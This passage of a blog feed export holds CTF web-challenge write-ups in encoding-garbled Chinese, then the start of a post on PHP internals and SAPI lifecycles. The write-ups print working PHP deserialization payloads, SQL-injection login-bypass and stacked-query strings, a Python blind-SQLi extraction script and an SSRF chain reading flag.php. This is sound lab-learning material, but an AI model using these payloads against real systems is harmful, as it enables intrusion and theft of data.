class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-comment">//</span><br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//è¿™ä¸ªåœ°æ–¹å¼ºåˆ¶è½¬æ¢ï¼Œå¾—æƒ³åŠæ³•å¤„ç†</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//ä¼ å‚å¿…é¡»æ˜¯ ascii å¯æ˜¾ç¤ºå­—ç¬¦</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);      <span class="hljs-comment">//ååºåˆ—åŒ– strå˜é‡</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª op = 1 ä¸å¤ªæƒ³ç”¨ï¼Œçœ‹ =2 çš„æƒ…å†µ</p><p>æˆ‘ä»¬éœ€è¦è§£å†³ä¸€ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>protectä¹‹åçš„ç‰¹æ®Šå­—ç¬¦</li><li> if($this-&gt;op === â€œ2â€)</li></ul><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102232636.png" alt="image-20220110223245549"></p><p>å¯è§ï¼Œé¢˜ç›®ç¯å¢ƒ PHP_version &gt;7.1 å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠ protected =&gt; publicï¼Œå› ä¸º7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ</p><p>è€Œifçš„å¼ºæ¯”è¾ƒå¯ä»¥ èµ‹å€¼ int(2) è¿™æ · int!=string å› æ­¤ä¹Ÿç ´åäº†æ¯”è¾ƒ</p><p>äºæ˜¯æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;./flag.php&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>æˆ‘ä¸ä¼š</p><p>çœ‹äº†çœ‹wpï¼Œå‘ç°åœ¨æŸ¥è¯¢ä¹‹åæºç ä¸­ä¼šæœ‰ä¸€ä¸ªhint</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br>base32 -&gt; base64 : select * from user where username = &#x27;$name&#x27;<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">å¯ä»¥äº†è§£åˆ°è¿™é‡Œ åªæŸ¥äº† username ä½†æ˜¯æ²¡æœ‰æ£€æŸ¥ passwd å­—æ®µï¼Œå°±æ˜¯è¯´ç„¶åæ€ä¹ˆåŠï¼Œä¸€å®šè¿˜æ˜¯æœ‰åˆ¤æ–­çš„ï¼Œä½†æ˜¯æ˜¯ä½“ç°åœ¨åç«¯å¤„ç†é€»è¾‘è¿™é‡Œï¼Œå®æ—¶ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬ç”¨ Union select çš„è¯æŸ¥åˆ°æ²¡æœ‰çš„å­—æ®µå°±ä¼šè‡ªå·±åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„å‡ºæ¥</code></pre></div><p>è¿™é¢˜ä¸€å…±æœ‰ä¸‰ä¸ªå­—æ®µ <code>admin&#39; union select 1,2,3,4#</code> </p><p>æŠ¥é”™ï¼š Error: The used SELECT statements have a different number of columns</p><p>å› æ­¤æœ‰ä¸‰ä¸ªå­—æ®µ</p><p>å› æ­¤æˆ‘ä»¬çš„ æµ‹è¯•çš„åŸºç¡€æ˜¯ <code>admin&#39; union select 1,2,3#</code></p><p>ä¸€èˆ¬è¿™ç§éƒ½æ˜¯ id username passwd å¯¹å§</p><p>äºæ˜¯ æœ‰ <code>admin&#39; union select 1,&#39;admin&#39;,3#</code></p><div class="code-wrapper"><pre><code class="hljs">é‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªpasswd è¿™å°±æ˜¯ åç«¯åŒ¹é…å¯†ç å®é™…åŒ¹é…çš„MD5å¤„ç†åçš„ç»“æœï¼Œä¾ç…§ä¸Šé¢è¯´çš„å…¶å®union select åªæœ‰æŸ¥åˆ°å®Œå…¨ä¸€æ¨¡ä¸€æ ·çš„æ•°æ®æ‰ä¼šè™šæ‹Ÿä¸€ä¸ªå‡ºæ¥ï¼Œé‚£æˆ‘ä»¬è¿™é‡Œpasswdå­—æ®µå¯æ§ äºæ˜¯å¯ä»¥è‡ªå®šä¹‰å¯†ç ç›´æ¥ä¼ </code></pre></div><p>æœ€åæœ‰ <code>1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></p><p>MD5è§£å¯†ç»“æœæ˜¯123</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>é¢ï¼Œç®—æ˜¯å¼ºç½‘æ¯é‚£é“çš„proç‰ˆæœ¬</p><p>åŸºæœ¬è¿™ç§ç®—æ˜¯å›ºå®š è€Œä¸”åƒçŸ¥è¯†çš„ç›´æ¥è®°ä½å§</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><blockquote><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p></blockquote><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>è„šæœ¬â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://d6bebfbc-0aab-4008-8fc6-6bf8134438ed.node4.buuoj.cn:81/index.php&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>num = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i, j)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload,<br>        &#125;<br><br>        r = requests.post(url, data=data)<br><br>        r.encoding = r.apparent_encoding<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            x = <span class="hljs-built_in">chr</span>(j)<br>            result += <span class="hljs-built_in">str</span>(x)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(result)<br>            num = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>çœ‹äº†çœ‹åªæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€å®šæ˜¯æœ‰ä¸€ä¸ªåŠŸèƒ½åœ¨æ‰§è¡Œä¸­å¯ä»¥ä¿®æ”¹ä¸€äº›å­—æ®µè¾¾åˆ°åˆ©ç”¨çš„ç›®çš„</p><p>è®¿é—® robots.txt å¾—åˆ° å¤‡ä»½è·¯å¾„ /user.php.bak è®¿é—®ä¸‹è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ssrf</p><p>ç‰›é€¼ï¼Œæˆ‘å¡ä½äº†ï¼ŒåŸæ¥åœ¨view.phpå“ªé‡Œè¿˜æœ‰ä¸€ä¸ªsqlæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">view.php?<span class="hljs-keyword">no</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#<br></code></pre></td></tr></table></figure><p>å¹¶ç¡®å®šäº† 2 çš„ä½ç½® ä¸ºå¯å›æ˜¾çš„ä½ç½®</p><p>æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">new</span> UserInfo();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">view</span>.php?no=-<span class="hljs-number">1</span>/**/union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),&#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;#<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºflagä¼šç›´æ¥ä½“ç°åœ¨æ³¨é‡Šé‡Œ</p><p>ç›´åˆ°æˆ‘å‘ç°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121318798.png" alt="image-20220112131756625"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPå†…æ ¸å­¦ä¹ åŠéƒ¨åˆ†æ ·ä¾‹</title>
    <link href="/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/"/>
    <url>/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å†…æ ¸å‰–æ"><a href="#å†…æ ¸å‰–æ" class="headerlink" title="å†…æ ¸å‰–æ"></a>å†…æ ¸å‰–æ</h1><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><ul><li><p><strong>build</strong> æ”¾ç½®å’Œæºç ç¼–è¯‘ç›¸å…³çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ buildconfï¼Œå’Œæ£€æŸ¥ç¯å¢ƒçš„è„šæœ¬</p></li><li><p><strong>ext</strong>     æ‹“å±•ç›®å½•ï¼Œæ‰€æœ‰éphpåŸºç¡€åŠŸèƒ½æ¯”å¦‚ <strong>substring</strong> éƒ½åœ¨è¿™ä¸ªç›®å½•ä»¥ä¸‹</p></li><li><p><strong>main</strong>   PHPåŸºç¡€è®¾æ–½</p></li><li><p><strong>Zend</strong>   Zendä¸»è¦å®ç°è¯­è¨€æ ¸å¿ƒçš„è¿è¡Œç¯å¢ƒï¼Œæ¯”å¦‚è„šæœ¬è¯­æ³•è§£æï¼Œopcodeæ‰§è¡ŒåŠå…¶æ‹“å±•æœºåˆ¶</p></li><li><p><strong>pear</strong>    PHPæ‹“å±•ä¸åº”ç”¨ä»“åº“ï¼ŒåŒ…å«PEARæ ¸å¿ƒæ–‡ä»¶</p></li><li><p><strong>sapi</strong>    å’Œå„ç§æœåŠ¡å™¨çš„æ¥å£è°ƒç”¨ï¼Œä¾‹å¦‚apacheã€IISç­‰ï¼Œä¹ŸåŒ…å«ä¸€èˆ¬çš„fastcgiã€cgiç­‰</p></li><li><p><strong>win32</strong>    Windowsç¯å¢ƒä¸‹ç¼–è¯‘PHPæœ‰å…³è„šæœ¬</p></li><li><p><strong>TSRM</strong>     çº¿ç¨‹å®‰å…¨ç›®å½•</p></li></ul><h3 id="PHPç”Ÿå‘½å‘¨æœŸ"><a href="#PHPç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="PHPç”Ÿå‘½å‘¨æœŸ"></a>PHPç”Ÿå‘½å‘¨æœŸ</h3><p>â€‹    SAPIæŒ‡PHPå…·ä½“åº”ç”¨çš„ç¼–ç¨‹æ¥å£ï¼Œä¸€åˆ‡ä»¥ <strong>SAPI å¼€å§‹</strong>ï¼Œæ— è®ºæ˜¯php-cliï¼Œè¿˜æ˜¯php-serverã€‚æ¯”å¦‚æˆ‘ä»¬å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™PHPè§£é‡Šå™¨è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œç›¸å½“äºæ˜¯é€šè¿‡URLè¯·æ±‚äº†ä¸€ä¸ªPHPé¡µé¢ã€‚</p><p>â€‹    PHP æ‰§è¡Œçš„ä¸¤ä¸ªé˜¶æ®µï¼Œå¤„ç†è¯·æ±‚ä¹‹å‰çš„å¼€å§‹é˜¶æ®µï¼Œè¯·æ±‚ä¹‹åçš„ç»“æŸé˜¶æ®µã€‚</p><p>â€‹    å¤„ç†è¯·æ±‚ä¹‹å‰çš„çš„å¼€å§‹é˜¶æ®µåŒ…æ‹¬ ï¼š</p><p>â€‹        1ï¸âƒ£ æ¨¡å—åˆå§‹åŒ–é˜¶æ®µ (MINIT)ï¼Œåªæ‰§è¡Œä¸€æ¬¡</p><p>â€‹        2ï¸âƒ£ æ¨¡å—æ¿€æ´»é˜¶æ®µ (RINIT)</p><h4 id="å•è¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ"><a href="#å•è¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="å•è¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ"></a>å•è¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ</h4><p><strong>CLI/CGIæ¨¡å¼</strong>éƒ½å±äºå•è¿›ç¨‹çš„SASPIæ¨¡å¼</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101726955.png" alt="image-20220110172604804"></p><p>å¦‚å›¾å®Œæˆäº†ä¸€ä¸ª æ¥å—å‚æ•° -&gt; åˆ›å»ºè¿›ç¨‹ -&gt; å¤„ç†è¯·æ±‚ -&gt; é”€æ¯è¿›ç¨‹ -&gt; ç»ˆæ­¢è¿›ç¨‹çš„æ“ä½œ</p><h4 id="å¤šè¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ"><a href="#å¤šè¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="å¤šè¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ"></a>å¤šè¿›ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸ</h4><p>â€‹    é€šå¸¸PHPæ˜¯<strong>ç¼–è¯‘ä¸€ä¸ªä¸­é—´ä»¶çš„æ¨¡å—</strong>æ¥å¤„ç†PHPè¯·æ±‚ã€‚Apacheä¸€èˆ¬ä¼šé‡‡å–å¤šè¿›ç¨‹æ¨¡å¼ã€‚Apacheä¼šforkå‡ºå¤šä¸ªå­è¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹å†…å­˜ç©ºé—´ç›¸å¯¹ç‹¬ç«‹ï¼Œæ•´ä¸ªè¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸä¼šå¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œåªæœ‰apacheå…³é—­æˆ–è€…è¿›ç¨‹ç»“æŸåæ‰ä¼šè¿›è¡Œå…³é—­é˜¶æ®µã€‚</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101732820.png" alt="image-20220110173239751"></p><p>å¤šçº¿ç¨‹çš„SAPIç”Ÿå‘½å‘¨æœŸå’Œ å¤šè¿›ç¨‹ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯å¤šçº¿ç¨‹æ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸé‡Œ<strong>å¹¶è¡Œçš„é‡å¤ è¯·æ±‚ å…³é—­çš„é˜¶æ®µ</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101733999.png" alt="image-20220110173308947"></p><h3 id="SAPIæ¦‚è¿°"><a href="#SAPIæ¦‚è¿°" 